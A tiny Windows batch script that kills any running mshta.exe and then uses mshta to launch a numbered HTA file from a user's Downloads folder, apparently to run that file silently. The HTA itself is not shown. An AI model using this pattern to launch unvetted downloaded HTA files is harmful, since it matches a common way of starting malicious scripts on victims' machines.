cd \
cd c:Windows\System32\
@echo off
taskkill /im mshta.exe /f
start  mshta.exe C:\Users\zahid\Downloads\950457.hta 
exit
